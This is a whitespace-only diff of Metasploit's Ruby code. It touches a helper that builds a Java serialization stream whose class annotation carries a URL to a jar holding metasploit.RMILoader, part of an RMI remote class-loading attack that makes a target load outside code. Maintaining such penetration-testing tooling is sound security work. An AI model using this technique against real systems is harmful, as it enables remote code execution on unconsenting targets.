@@ -50,7 +50,7 @@ module Msf
         # arbitrary classes
         #
         # @param jar_url [String] the (URL) location pointing to the jar containing the
-        #                         metasploit.RMILoader.
+        #   metasploit.RMILoader.
         # @return [Rex::Java::Serialization::Model::Stream]
         def build_gc_call_data(jar_url)
           stream = Rex::Java::Serialization::Model::Stream.new
@@ -63,8 +63,8 @@ module Msf
 
           new_array_annotation = Rex::Java::Serialization::Model::Annotation.new
           new_array_annotation.contents = [
-              Rex::Java::Serialization::Model::NullReference.new,
-              Rex::Java::Serialization::Model::EndBlockData.new
+            Rex::Java::Serialization::Model::NullReference.new,
+            Rex::Java::Serialization::Model::EndBlockData.new
           ]
 
           new_array_super = Rex::Java::Serialization::Model::ClassDesc.new
@@ -96,8 +96,8 @@ module Msf
           new_class_desc.fields = []
           new_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new
           new_class_desc.class_annotation.contents = [
-              Rex::Java::Serialization::Model::Utf.new(nil, jar_url),
-              Rex::Java::Serialization::Model::EndBlockData.new
+            Rex::Java::Serialization::Model::Utf.new(nil, jar_url),
+            Rex::Java::Serialization::Model::EndBlockData.new
           ]
           new_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new
           new_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new
